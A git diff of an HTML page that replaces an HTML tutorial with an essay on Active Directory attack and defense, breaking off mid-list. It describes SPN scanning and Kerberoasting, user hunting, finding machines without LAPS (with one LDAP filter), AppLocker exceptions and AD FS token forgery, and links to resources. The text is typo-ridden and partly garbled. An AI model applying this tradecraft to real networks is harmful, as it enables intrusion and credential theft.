@@ -2,14 +2,14 @@
 <html lang="en" >
 <head>
   <meta charset="UTF-8">
-  <title>Technical Documentation Project (Techgeekbuzz)</title>
+  <title>Active Directory (AD) Attack & Defense Documentation</title>
   <link rel="stylesheet" href="./style.css">
 <style>html,
 body {
   min-width: 290px;
   color: #4d4e53;
   background-color: #ffffff;
-  font-family: "Open Sans", Arial, sans-serif;
+  font-family: "Open Sans", Poppins, sans-serif;
   line-height: 1.5;
 }
 
@@ -131,288 +131,731 @@ table {
   #documentation {
     margin-left: -10px;
   }
-}</style>
+}
+</style>
 </head>
 <body>
 <!-- partial:index.partial.html -->
 <body>
-  <nav id="sidebar">
-    <h2>HTML</h2>
-    <ul>
-      <li><a class="nav-item" href="#Introduction">Introduction</a></li>
-      <li>
-        <a class="nav-item" href="#html_editors">HTML Editors</a>
-      </li>
-      <li>
-        <a class="nav-item" href="#html_elements">HTML Elements</a>
-      </li>
-      <li><a class="nav-item" href="#html_attributes">HTML Attributes</a></li>
-      <li><a class="nav-item" href="#html_heading">HTML Heading</a></li>
-      <li>
-        <a class="nav-item" href="#html_paragraph">HTML Paragraph</a>
-      </li>
-      <li><a class="nav-item" href="#html_style">HTML Style</a></li>
-      <li><a class="nav-item" href="#html_formatting">HTML Formatting</a></li>
-      <li><a class="nav-item" href="#reference">Reference</a></li>
-    </ul>
-  </nav>
-  <main id="documentation">
-    <section id="Introduction">
-      <h2>Introduction</h2>
-      <article>
-        <p>
-          HTML is an acronym for HyperText Markup Language, and it is the
-          standard language for creating web-pages. Every web page you surf on
-          your browser is built using HTML. The primary use of HTML to provide
-          a proper structure to the web-page so all the content or data of the
-          page could represent adequately. A stand-alone HTML can create only
-          static and skeleton looking black and white pages, but with the help
-          of CSS and JavaScript , we can create a more interactive and
-          intuitive web-page. When we try to visit a website or click on the
-          link, we basically request the server to show us the page, then the
-          server acts on our request and sends us an appropriate HTML document
-          as a response. Then this HTML document parsed by browse, and we able
-          to see the content.
-        </p>
-        <h3>HTML Document</h3>
-        <pre>
-&lt;!DOCTYPE html&gt;
-                &lt;html&gt;
-                &lt;head&gt;
-                &lt;title&gt;Page Title&lt;/title&gt;
-                &lt;/head&gt;
-                &lt;body&gt;
+<nav id="sidebar">
+<h2>AD Attack & Defense</h2>
+<ul>
+<li><a class="nav-item" href="#Introduction">Introduction</a></li>
+<li><a class="nav-item" href="#html_editors">HTML Editors</a></li>
+<li><a class="nav-item" href="#html_elements">HTML Elements</a></li>
+<li><a class="nav-item" href="#html_attributes">HTML Attributes</a></li>
+<li><a class="nav-item" href="#html_heading">HTML Heading</a></li>
+<li><a class="nav-item" href="#html_paragraph">HTML Paragraph</a></li>
+<li><a class="nav-item" href="#html_style">HTML Style</a></li>
+<li><a class="nav-item" href="#html_formatting">HTML Formatting</a></li>
+<li><a class="nav-item" href="#reference">Reference</a></li>
+</ul>
+</nav>
 
-                &lt;h1&gt;This is a Heading&lt;/h1&gt;
-                &lt;p&gt;This is a paragraph.&lt;/p&gt;
+<main id="documentation">
+<section id="Introduction">
+<h2>Active Directory: Attack & Defense Resources for Offensive and Defensive Security Professionals & Ethical Hackers</h2>
+<article>
+<p>This page is a practical resource for anyone who wants to understand the exact <em>Tactics, Techniques, and Procedures (TTPs)</em> attackers use to compromise Active Directory-and how to stop them. It maps out the full AD kill chain and today's post-exploitation tradecraft so you can detect, prevent, and mitigate every step of the attack chain.</p>
+</article>
+</section>
 
-                &lt;/body&gt;
-                &lt;/html&gt;</pre>
-      </article>
-    </section>
-    <section id="html_editors">
-      <h2>HTML Editors</h2>
-      <article>
-        <p>
-          However, you can use notepad to create and edit HTML documents, but
-          we recommend to install an open-source editor. There are many free
-          to use text-editor software present on the internet, which provides
-          a better interactive User interface and some add-on functionality
-          which you miss on a notepad.
-        </p>
-        <p>Here is the list of top 4 HTML text editors you can pick:</p>
+<section id="discovery">
+<h2>Discovery</h2>
+<h3> SPN Scanning</h3>
+<article>
+<p>Discovery inside an Active Directory environment is the moment an intruder stops being a blind stranger and starts becoming a knowledgeable insider. After a single valid domain credential is captured - often nothing more than the password of a helpdesk intern or a service account found in a forgotten script - the attacker can turn every domain controller into an open encyclopedia. By sending nothing more than suspicious than the same Lightweight Directory Access Protocol (LDAP) queries that Outlook, SharePoint, or even the Windows log-on screen issue every day, the intruder slowly assembles a complete map of the target organization: who the users are, which machines they use, what groups grant them power, where the file shares live, and how the forests and domains trust one another. Because all of this traffic is encrypted, signed, and perfectly ordinary among the background noise of the every day grind, it rarely trips an alert or raises an eyebrow. To most security products, however, it looks like normal business traffic as usual. Nothing more than the usual business chatter of the day-to-day grind. On the other hand, this presents opportunities for the attacker as this position will later serve as the scaffolding on which every future move and attack progression will be dependant on and built from.</p>
+<p>Within that broader reconnaissance effort, Service Princiapl Name (SPN) Scanning is the precision stoke that turns a vague architectural sketch into a rack of ready-to-steal keys. Any account that has an SPN is, by definition, a service account: it runs SQL Server, a web application, a VMware endpoint, or some other daemon that must authenticate incoming users. When a domain user asks a domain controller for a ticket to such a service, the controller happily obliges and issues one, encrypted with the service account's own password. The attacker then simply requests tickets for every SPN discovered, collects the resulting BLOBs, and walks away. Offline, with nothing more than a laptop, a word-list, and plenty of time, the attacker can attempt to crack those tickets at their own leisure; each cracked password is a new set of credentials to play around with, often with elevated privileges, and frequently reused across dozens of servers and services. Because the request itself is indistinguishable from a legitimate user about to connect to the database or an intranet site, the only footprint on the wire is a modest spike in Kerberos traffic-something most organizations neither log nor inspect, and, if noticed, would probably land on the assumption that it is a group of users returning from lunch (or shift change) and all users are logging in and or on around the same time of one another.</p>
+<p>The quiet elegance of these steps is what makes them so inherently dangerous. No exploits are fired, no malware is dropped. implanted, or embedded, and no lateral movement or privilege escalation has yet occurred; the attacker is simply reading what the directory already provides to the users and was designed to publish by default. Yet by the time the first real malicious action is set forth and taken-perhaps a Pass-the-Hash leap to a finance server or a DCSync extraction of the entire password database-the attacker already knowns the shortest path to domain admin, which service accounts are likely to have weak passwords, and where the senstiive file shares live. Defending against this phase therefore requires more than patching; it demands a deliberate redesign of how the directory exposes information and how service accounts are managed. Restricting ordinary users from reading <code>servicePrincipalName</code> attributes, mandating 25-character, machine-managed passwords through Group Managed SErvice Accounts (gMSAs), forcing AES-256 whlie disabling the crackable RC4 legacy cipher, and funneling LDAP queries through signed channels all raise the attacker's cost from pennies to dollars. Coupled with vigilant logging-watching for the single user who suddenly enumerates every computer object or requests one hundred different service tickets in five minutes-defenders can turn the directory's openness from an invitation into a trap, and transform what began as silent reconnaissance into an early warning that the intrusion has begun.</p>
+</article>
+</section>
 
-        <ul>
-          <li>Sublime Text Editor</li>
-          <li>Notepad++</li>
-          <li>Visual Studio Code</li>
-          <li>Atom</li>
-        </ul>
-      </article>
-    </section>
-    <section id="html_elements">
-      <h2>HTML Elements</h2>
-      <article>
-        <p>
-          The HTML elements provide the semantic meaning to the web-page
-          content. We usually interchangeably use the term HTML elements and
-          tags, but technically both are different. An HTML tag is just a
-          character inside the angle bracket<>, whereas the HTML element is a
-            collection of starting tag, its attribute, content and end tag. For
-            example:
-        </p>
-        <pre>&lt;p class= "para"&gt; Hello World &lt;/p&gt;</pre>
-      </article>
-    </section>
-    <section id="html_attributes">
-      <h2>HTML Attributes</h2>
-      <article>
-        <p>
-          In HTML, the attributes are used to provide additional information
-          about the elements. For most of the HTML elements, attributes are
-          optional, but there are some elements where we have to deliver the
-          attributes. Attributes always specified within the opening tag of
-          the HTML element and they specified in a name and value pair.
-          <strong> Example </strong>
-        </p>
-        <pre>&lt;image src= "cat.jpg" alt ="cat image"&gt;</pre>
-        <p>
-          In this example src ="cat.jpg" and alt="cat image" are two
-          attributes where src and alt are attributes name and "cat.jpg" and
-          "cat image" are attributes values. Here alt attribute is optional,
-          but src is mandatory because src specify which image to show. There
-          should be at least one space gap between two attributes, and the
-          value of the attributes must have resided in the double inverted
-          comma. Some most important HTML
-        </p>
-      </article>
-    </section>
-    <section id="html_heading">
-      <h2>HTML Heading</h2>
-      <p>
-        To display the section heading, title or subtitle we can use the HTML
-        heading tags. In HTML 5 we have 6 heading tags start from &lt;h1&gt;
-        up to &lt;h6&gt;, where &lt;h1&gt; specify the largest heading and
-        &lt;h6&gt; represent the smallest or sub heading. If the content is
-        specified by heading tags, then it would be displayed large and bold
-        as compared to other text content present on the web-page.
-        <strong> Example </strong>
-      </p>
-      <pre>
-&lt;h1&gt;First Heading &lt;/h1&gt;
-            &lt;h2&gt;Second Heading &lt;/h2&gt;
-            &lt;h3&gt;Third Heading &lt;/h3&gt;
-            &lt;h4&gt;Forth Heading &lt;/h4&gt;
-            &lt;h5&gt;Fifth Heading &lt;/h5&gt;
-            &lt;h6&gt;Sixth Heading &lt;/h6&gt;</pre>
-    </section>
-    <section id="html_paragraph">
-      <h2>HTML Paragraph</h2>
-      <article>
-        <p>
-          In HTML paragraphs can be defined using &lt;p&gt; element. Paragraph
-          text always starts from a new line, the browser parsed the &lt;p&gt;
-          tag and automatically add some margin and white space after the end
-          &lt;/p&gt; tag.
-        </p>
-        <pre>
-&lt;p&gt; Hello! and Welcome to TechGeekBuzz &lt;/p&gt;
-                &lt;p&gt; Here you get to know all about the latest technology. &lt;/p&gt;</pre>
-      </article>
-    </section>
-    <section id="html_style">
-      <h2>HTML Style</h2>
-      <article>
-        <p>
-          Every browser has a specific engine that parses the HTML document and displays a default style of the page content.
-        </p>
-        <pre>&lt;body style="background-color:yellow;"&gt;
+<section id="spn-res">
+<h2>Active Directory Discovery & SPN Scanning Resources</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=1508">SPN Scanning: Service Discovery Without Network Port Scanning</a></li>
+<li><a href="https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx">Active Directory: PowerShell Script to List All SPNs Used</a></li>
+<li><a href="https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/">Discovering Service Accounts Without Using Privileges</a></li>
+</ul>
+</section>
 
-                &lt;h1&gt;TechGeekBuzz&lt;/h1&gt;
-                &lt;p&gt;Welcome to TechGeekBuzz.&lt;/p&gt;
-                
-                &lt;/body&gt;</pre>
-      </article>
-    </section>
-    <section id="html_formatting">
-      <h2>HTML Formatting</h2>
-      <article>
-        <p>
-          In HTML, we have many special elements that can provide special meaning to text content.
-        </p>
-        <div class="hscroll">
-          <table>
-            <tbody>
-              <tr>
-                <td>
-                  <a href="https://www.techgeekbuzz.com/html-elements/">
-                    HTML Elements
-                  </a>
-                </td>
-                <td>
-                  Description
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;b&gt;
-                </td>
-                <td>
-                  Bold the text
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;strong&gt;
-                </td>
-                <td>
-                  An alternative for &lt;b&gt;, which tell that this text is essential.
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;i&gt;
-                </td>
-                <td>
-                  Italic the text
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;em&gt;
-                </td>
-                <td>
-                  Similar to italic but used when we want to emphasize the text.
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;mark&gt;
-                </td>
-                <td>
-                  It marks the text with a default "yellow" background colour
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;small&gt;
-                </td>
-                <td>
-                  Decrease the text size
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;del&gt;
-                </td>
-                <td>
-                  It prints a cross line over the text.
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;ins&gt;
-                </td>
-                <td>
-                  Represents the inserted text by putting an underline.
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;sub&gt;
-                </td>
-                <td>
-                  This element is used to display the subscript.
-                </td>
-              </tr>
-              <tr>
-                <td>
-                  &lt;sup&gt;
-                </td>
-                <td>
-                  It can make a text superscript.
-                </td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-      </article>
-    </section>
+<section id="data_mining">
+<h3>Data Mining in Active Directory</h3>
+<article>
+<p>Data mining in Active Directory disvoery is the phase where an intruder moves from simply listing objects to interrogating the subtle attributes that reveal who matters, what they can touch, and how their access can be chained into something more powerful. The directory is not just an open phonebook; it is a relational database whose fields encode years of organizational drift: accounts created for long-forgotten projects, groups whose memberships no administrator can confidently explain, and permissions granted during late-night outages and never revoked. An attacker who understands this treats the domain as a rich ore deposit and begins to quarry it, running queries that return far more than names and passwords. By cross-referncing the <code>lastLogonTimestamp</code> of every computer the domain knows about, the intruder quickly learns which servers are still patched into the network but no longer actively managed-prime staging grounds that will not be missed. By parsing the <code>msDS-AllowedToDelegateTo</code> attribute, the intruder uncovers web servers trusted to impersonate users to backend databases, a misconfiguration that can be quickly weaponized into a hop from the DMZ to the data tier without ever touching a workstation. Every something as innocuous as the description field becomes a miniature intelligence brief: <code>"svc-backup-</code>Domain Admin for legacy NT backups" tells the attacker exactly which account to Kerberoast first and what password scheme the enterprise favored decades ago.</p>
+<p>The process is iterative and self-refining. Each new attribute harvested is fed back into the query logic, narrowing the search space and surfacing ever-higher valued targets. After discovering that a handful of accounts have the "Sensitive and cannot be delegated" flag cleared, the attacker searches for those same accounts in the membership lists of privileged groups, then checks whether their <code>userAccountControl</code> flags stil allow DES encryption-an obsolete cipher whose 56-bit keys fall in minutes. If BloodHound or a similar graphing tool like Adelanche is available, these scattered data points are assembled into a lattice: nodes that represent users and computers, edges encode administrative rights, session presence, or constrained delegation, and shortest-path algorithms highlight the three-or four-hop route from the current toehold to full forest dominance. The result is not a flat inventory but a prioritized attack roadmap, ranked by likelihood of success and estimated time to compromise.</p>
+<p>What makes this mining operation so difficult to detect is that every query is technically legitimate if you think about it logically for a brief minute. The attacker never asks or requests for anything that a normal helpdesk technicain might not also need; the difference, however, lies in volume, velocitym and cross-correlation. A single script can pull tens of thousands of AD objects overnight, and then spend days crunching and cracking them offline, producing unimaginable insights that would take an audit team weeks to identify and uncover. Unless the security team has baselined normal LDAP consumption-something few organizations ever do-the spike in reads is invisible against the daily background noise of Exchange address-book and replication syncs, and printer-discovery broadcasts. The only real reliable tell is the pattern that emerges afterward: the same low-privileged account suddenly begins targeting Kerberos service tickets for exactly the SQL clusters that the mined data identified as delegation-enabled, or it mounts C$ shares on precisely the dormant file servers whose last logon was more than 180 days ago. Recognizing that sequence requires shifting defenses from the traditional perimeter mindset to one that treats every read operation as potentially hostile and one that invests as much in understanding the directory's own schema as attackers already do. </p>
+</article>
+</section>
 
-    <section id="reference">
-      <h2>Reference</h2>
-      <article>
-        <ul>
-          <li>
-            All the documentation in this page is taken from
-            <a href="https://www.techgeekbuzz.com/tutorial/html/" target="_blank">HTML Tutorial</a>
-          </li>
-        </ul>
-      </article>
-    </section>
-  </main>
+<section id="datamine-res">
+<h2>Data Mining Resources</h2>
+<ul>
+<li><a href="https://thevivi.net/2018/05/23/a-data-hunting-overview/">A Data Hunting Overview</a></li>
+<li><a href="https://blog.harmj0y.net/redteaming/push-it-push-it-real-good/">Push It, Push It Real Good</a></li>
+<li><a href="https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql">Finding Sensitive Data on Domain SQL Servers Using PowerUpSQL</a></li>
+<li><a href="https://www.youtube.com/watch?v=ZIOw_xfqkKM">Sensitive Data Discovery in Email with MailSniper</a></li>
+<li><a href="https://www.fortynorthsecurity.com/remotely-search/">Remotely Searching for Sensitive Files</a></li>
+<li><a href="https://blog.harmj0y.net/penetesting/i-hunt-sysadmins/">I Hunt Sysadmins - harmj0y</a></li>
+</ul>
+</section>
+
+<section id="user_hunting">
+<h3>User Hunting</h3>
+<article>
+<p>User hunting is the moment when the reconnaissance campaign stops cataloging machines and starts stalking people. After the intruder has mapped the forest, the next logical hunger is for credentials that open doors, and those credentials are always attached to a human or to a service that behaves like one. The directory, generous as ever, will tell a story about every account if you know how to ask it nicely. An attacker begins with the most obvious-members of Domain Admins, Account Operators, or custom groups whose names contain <code>"-adm"</code>, <code>"-srv"</code>, or <code>"-sql"</code>-but quickly moves to subtler prety. The attribute <code>pwdLastSet</code> is more revealing that any organizational chart: an account whose password has not changed in eight years almost certainly protects something critical, because the owner is too afraid to touch it. Logon scripts or home-drive paths that point to deep reaches of the file system betray legacy applications whose service accounts still run with the privileges of a bygone era. Even the combination of country code and office attributes can surface a VIP: the one executive whose account is the only one in the <code>OU=Executives,OU=US,DC=corp,DC=com</code> and whose manager attribute is blank.</p>
+<p>ONce a shortlist exists, the hunter narrows the field by watching living activities. The attribute <code>logonCount</code> is reset only when the password changes, so an account that shows thousands of logons but an ancient password is a safe bet for lateral movement: the user is present, predictable, and unlikely to notice an extra Kerberos ticket in the cache. Similarly, the <code>badPwdCount</code> field exposes the impatient employee who mistypes credentials every Monday morning; lockout thresholds are often relaxed for such users, making them ideal candidates for password spray attacks that need more than the usual five guesses. Tools like <code>Get-NetSession</code> or <code>PVEFindADUser</code> translate these static clues into real-time confirmations: they query remote computers to see which of the promising accounts currently has a writable SMB session, turning an abstract risk into a concrete next hop. The attacker is no longer riffling through a phonebook, they are standing outside the office building, notebook in hand, ticking off names as employees badge in.</p>
+<p>The final refinement is correlation across time. By repeatedly sampling <code>lastLogonTimestamp</code> over several days, the hunter learns the commuting patterns of privileged users: the database administrator who never logs on before 0930, the helpdesk contractor whose RDP sessions always orginate from the same jump host, the service account that mysteriously authenticates at 0200 when the backup window is officially 2300-0100. These rhyth,ic patterns become primary attack windows of opportunity for our attacker. A stolen ticket injected thrity seconds after the real user has authentiated is unlikely to trigger a "duplicate logon" alert, because most monitoring tools treat time skews of a few minutes as normal Kerberos drift. Conversely, an account that suddenly logs on outside its habitual envelope-say, the CFOs credential form a workstation in the research lab-flags the compromise for anyone who even bothered to baseline behavior, but that baseline is precisely what most enterprises never construct. User hunting therefore rewards patience: the longer the observer observes, the safer the eventual impersonation becomes. In the end, the directoy has not been hacked; it has simply been read with hostile intent, and the people whose names it quietly carries find themselves shadowed by an adversary who knows their schedules better than their own assistants do. </p>
+</article>
+</section>
+
+<section id="userhunt-res">
+<h2>User-Hunting Resources</h2>
+<ul>
+<li><a href="https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/">Hidden Administrative Accounts: BloodHound to the Rescue</a></li>
+<li><a href="https://adsecurity.org/?p=2535">Active Directory Recon Without Admin Rights</a></li>
+<li><a href="https://adsecurity.org/?p=3719">Gathering AD Data with the ActiveDirectory PowerShell Module</a></li>
+<li><a href="http://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html">Using the ActiveDirectory PowerShell Module for Domain Enumeration From PowerShell Constrained Language Mode</a></li>
+<li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions">PowerUpSQL Active Directory Recon Functions</a></li>
+<li><a href="https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8">Derivative Local Admin</a></li>
+<li><a href="https://wald0.com/?p=14">Automated Dervative Administrator Search</a></li>
+<li><a href="https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/">Dumping Active Directory Domain Info-with PowerUpSQL!</a></li>
+<li><a href="https://blog.harmj0y.net/redteaming/local-group-enumeration/">Local Group Enumeration</a></li>
+<li><a href="https://blog.stealthbits.com/local-admin-mapping-bloodhound">Attack Mapping With BloodHound</a></li>
+<li><a href="https://pentestlab.blog/2018/05/28/situational-awareness/">Situational Awareness</a></li>
+<li><a href="https://www.javelin-networks.com/static/5fcc6e84.pdf">Commands for Domain Network Compromise</a></li>
+<li><a href="https://blog.harmj0y.net/activedirectory/a-pentesters-guide-to-group-scoping/">A Pentester's Guide to Group Scoping</a></li>
+</ul>
+</section>
+
+<section id="laps">
+<h3>LAPS: Local Administrator Password Solution</h3>
+<article>
+<p>Local Administrator Password Solution-LAPS-was invented to solve the ancient problem of identical admin passwords on every workstation, but to an attacker engaged in discovery it is also a map that can be read backward. Because LAPS stores each computer's current local Administrator password in a confidential attribute of the computer object itself, the very mechanism that keeps desktops from sharing credentials advertises, to anyone with the right query, which machines are individually managed and which are still swimming in the old ocean of stale, shared secrets. The first clue is simply whether the attribute <code>ms-Mcs-AdmPwdExpirationTime</code> exists. If it does, the box is enrolled; if it does not, the box is either exempted or forgotten about, and forgotten machines are the kind an intruder just loves: they tend to sit in cold conference rooms, labs, or factory floors, powered on but rarely patched, logged into by technicians who still type the same local "Admin123!" they have used since 2012. A single LDAP filter-<code>(&(objectCategroy=computer)(!ms-Mcs-AdmPwd=*))</code> returns the abandoned population in seconds, a ready-made pool of toeholds for lateral movement that bypasses the whole LAPS architecture without ever touching its encrypted payload.</p>
+<p>When the attribute is present, the attacker's interest only deepens. LAPS grants read access to the password through a security descriptor that is meant to be tightly scoped, but in practice those permissions drift like every other ACL in the enterprise. Helpdesk groups granted read rights during the pilot phase remain in place years later; desktop support contractors added to "Workstation Admins" inherit visibility across the ntire OU tree; and GPOs that delegate "Read <code>ms-Mcs-AdmPwd"</code> to a seeminly harmless service account forget to exclude servers that happen to live in the same parent container. Discovery becomes an exercise in peeling back these layers. By enumerating the <code>ActiveDirectoryRights</code> property of each computer object's ACL, an intruder can build a second list-this one containing the security principlas who already possess the keys to the local kindgom. A user who can read one LAPS password rotate every thirty or sixty days, the access is renewable: today's file server admin is tomorrow's domain controller local admin, dpending on which GPO last applied. The hunter, therefore, treats the LAPS reader group as a shadow administrative tier, often more privileged on the endpoint layer than many formal Domain Admins who never log on to workstations (edit: or who are not supposed to be).</p>
+<p>Finally, the rotation timestamp itself leaks behavioral intelligence. <code>ms-Mcs-AdmPwdExpirationTime</code> is a 64-bit Windows file-time value that reveals when each password will next change. Sampling this field across the fleet exposes maintenance windows, patching cycles, and helpdesk shifts: a cluster of machines whose passwords all expire within the same ten-minute slice on the second Tuedsday of every month is clearly managed by an automated task, probably triggered by the same SCCM deployment that will reboot the boxes later that evening. An attacker who intends to plant a persistent backdoor can introduce it just after that rotation, comfortable that the local credential will remain stable for the full policy window.</p>
+<p>Conversely, a machine whose timestamp updates irregularly, drifting by hours or days, is under manual control-evidence of an administrator who logs on interactively, types the password by hand, and might notice an extra scheduled task. In this way LAPS becomes a kind of administrative seismograph: every small tremor in the expiration field records a human decision, and the patient observer can read those ripples to best choose the moment when the machine is least watched. Discovery, then, is not finished when the attacker learns who is admin over what; it is finished when the directory confesses how often those admins change their locks, and whether anyone still bothers to check that the new key still fits.</p>
+</article>
+</section>
+
+<section id="laps-res">
+<h2>LAPS Resources</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=3164">Microsoft LAPS Security & Active Directory LAPS Configuration Recon</a></li>
+<li><a href="https://blog.harmj0y.net/powershell/running-laps-with-powerview/">Running LAPS with PowerView</a></li>
+<li><a href="https://rastamouse.me/tags/laps/">RastaMouse LAPS Part 1 & 2</a></li>
+</ul>
+</section>
+
+<section id="applocker">
+<h3>AppLocker</h3>
+<article>
+<p>AppLocker arrives in most enterprises as a policy technology, a way to keep users from running the wrong executable, but to anyone who has ever watched an intrusion unfold it is also a language that attackers learn to read before they ever drop a payload. The rules live in <code>SYSVOL</code>, replicated to every domain controller, readable by any authenticated user; that alone makes them part of the discovery phase. An intruder who has just landed on a workstation can mount the domain’s <code>NETLOGON</code> share and open the XML files that define which paths, publishers, and file hashes are trusted. In a few seconds the policy reveals whether the environment is still in default-permissive mode—allowing everything in Program Files and Windows while blocking only <code>%TEMP%</code>—or whether security teams have tried to tighten the net by requiring signed binaries or specific publisher certificates. The distinction matters because it tells the attacker how much effort must be spent on living-off-the-land techniques versus investing in a genuine code-signing certificate or finding an exploitable signed binary that can host a side-loaded DLL.</p>
+<p>Once the baseline is understood, the hunt begins for the inevitable exceptions. AppLocker rules are granular, and every enterprise accumulates shadow relaxations: a helpdesk tool that updates itself out of a user's roaming profile, an old ERP client that ships unsigned, a developer group that persuaded management to whitelist an entire drive letter. These exemptions are stored in the same readable XML, often with human-readable comments that explain the business justification and the expiry date that no one ever removed. An attacker can therefore scan for path rules that end in wildcards like <code>"D:*"</code> or <code>“C:\ProgramData\Custom*”</code>, note the file hashes that have been manually approved, and even extract the exact thumbprints of certificates that are trusted for publisher rules. That information becomes a shopping list: any binary dropped into an exempted path, or any file signed by an approved but loosely guarded certificate, executes without ceremony. In practice the attacker rarely needs to bring a custom payload; instead, they locate the oldest, least-monitored signed updater that the policy itself blesses, replace a side-loaded library, and inherit both execution and legitimacy in one move.</p>
+<p>Discovery does not stop at the rules themselves. AppLocker writes events to the local Application and Services log whenever something is allowed or denied, and those event IDs—8002, 8003, 8004—are visible to any process that can read the event log. By querying the last twenty-four hours of entries, an intruder can measure how often the policy is actually enforced and whether anyone is watching the denials. A workstation that shows a steady trickle of blocked scripts in <code>%APPDATA%</code> is probably under active hardening; the same log silent for weeks suggests that either the policy is newly deployed and still permissive, or the security team has routed events to a collector that the current user cannot reach. In either case the attacker learns whether noisy experimentation will draw attention. If the logs are forwarded, the intruder can still test cautiously: a single allowed execution of <code>msbuild.exe</code> or <code>installutil.exe</code> from an exempted path confirms that the rule engine is awake but friendly, and that becomes the launchpad for in-memory assemblies that never touch disk. Thus AppLocker, designed to be a gatekeeper, becomes a reconnaissance surface: its published rules describe the shape of the open windows, its logged verdicts reveal the vigilance of the guards, and its exceptions mark the soft spots where an attacker can step through without rattling the lock.</p>
+</article>
+</section>
+
+<section id="applock-res">
+<h2>AppLocker Resources</h2>
+<ul>
+<li><a href="https://rastamouse.me/blog/applocker/">Enumerating AppLocker Configs</a></li>
+<li><a href="https://www.varonis.com/blog/applocker-bypass-risks">Revealing AppLocker Bypass Risks</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions">AppLocker Processes and Interactions</a></li>
+<li><a href="https://www.splunk.com/en_us/blog/security/-applocker-rules-as-defense-evasion-complete-analysis.html">AppLocker Rules as Defense Evasion: Complete Analysis</a></li>
+<li><a href="https://community.cyberark.com/s/article/Applocker-Windows-Logs">AppLocker Windows Logs</a></li>
+<li><a href="https://www.splunk.com/en_us/blog/security/deploy-test-monitor-mastering-microsoft-applocker-part-2.html">Deploy, Test, Monitor: Mastering Microsoft AppLocker, Part 2</a></li>
+<li><a href="https://michaelwaterman.nl/2024/06/02/mastering-applocker-security-group-exceptions/">Mastering AppLocker: Security Group Exceptions</a></li>
+</ul>
+</section>
+
+<section id="adfs">
+<h3>Active Directory Federated Services (AD FS)</h3>
+<article>
+<p>Active Directory Federation Services is the quiet diplomat of the modern enterprise, translating the domain’s native Kerberos tickets into the SAML, WS-Federation, and OAuth tokens that let employees reach Salesforce, Office 365, and every other cloud that refuses to trust a legacy NTLM hash. To attackers it is also a second treasure house, equal in value to the domain controller itself but guarded by a different language and monitored by a different set of eyes. The first hint of its presence is usually a DNS record that resolves to something cryptic like <code>“sts.corp.com”</code> or <code>“login.company.net”</code> but the real footprint lives in AD: a service account whose <code>userPrincipalName</code> ends in the federation namespace, an SPN beginning with <code>“HTTP/sts.corp.com”</code>, and an object of class <code>msDS-GroupManagedServiceAccount</code> or, in older farms, a plain user account granted the improbable right to decrypt Kerberos tickets on behalf of the entire organization.</p>
+<p>Discovery therefore starts with an LDAP filter that asks for every account possessing an SPN that contains the farm name; the results map the internal nodes of the federation trust, from the primary server in the head-office DMZ to the secondary that sits in a distant Azure subnet and is rarely patched on time.</p>
+<p>Once the service accounts are enumerated, the attacker studies the trust fabric itself. AD FS stores its configuration in a database—sometimes SQL, sometimes the Windows Internal Database—but the most sensitive artifacts are replicated into AD for high availability. The object <code>CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=com</code> holds the token-signing certificate thumbprints, the relying-party identifiers, and the encrypted secondary credentials that the farm uses to authenticate back to the directory.</p>
+<p>Read access to that container is supposed to be restricted to the farm account and to the built-in AD FS administrators group, yet in practice the ACL drifts outward: monitoring tools that needed “read everything” during a troubleshooting call, DevOps engineers who joined the group temporarily and never left, or a GPO that granted “Enterprise Read-Only Domain Controllers” a blanket replication privilege and incidentally exposed the farm’s secrets.</p>
+<p>Furthermore. an intruder who locates such an over-permissioned account can pull the entire configuration offline, decrypt the secondary credentials with a key that is itself protected by the farm service account’s password hash, and forge SAML tokens that are indistinguishable from legitimate assertions. Because the token-signing certificate is trusted by every relying party in the federation, the attacker now has a skeleton key to every cloud application that accepts the organization’s identity provider, often without the need to ever touch the on-premises domain again.</p>
+<p>The final layer of discovery is behavioral. AD FS writes verbose logs—authentication success, failure, password expiry, certificate rollover—but those logs are collected in a separate Event Tracing for Windows session that many SOC engineers never add to their SIEM.</p>
+<p>By querying the local Security log on the federation server, or by reading the administrative events forwarded to a SIEM that the current user can still query, an attacker can measure how frequently new certificates are rolled, whether additional relying parties have been added recently, and which external domains are the heaviest consumers of tokens. A sudden spike in failures against a single relying party might indicate that the tenant there is already under investigation and that conditional-access policies are being tightened; conversely, a long quiet period for an obscure SaaS application suggests an overlooked trust that can be abused without triggering anomaly detectors.</p>
+<p>In this way the federation service becomes both target and telescope: its published endpoints reveal the cloud footprint of the enterprise, its encrypted databases hold the material for forging infinite identities, and its audit trail broadcasts the rhythm of the security team’s vigilance. Compromise AD FS and you do not merely inherit the domain; you inherit every SaaS tenant, mobile application, and business partner that ever agreed to accept its word.</p>
+</article>
+</section>
+
+<section id="adfs-res">
+<h2>AD FS Resources</h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=oTyLdAUjw30">118 Attacking ADFS Endpoints with PowerShell</a></li>
+<li><a href="https://blog.netspi.com/using-powershell-identify-federated-domains/">Using PowerShell to Identify Federated Domains</li></a>
+<li><a href="https://github.com/mdsecresearch/LyncSniper">LyncSniper: A Tool for Penetration Testing Skype for Business and Lync Deployments</li></a>
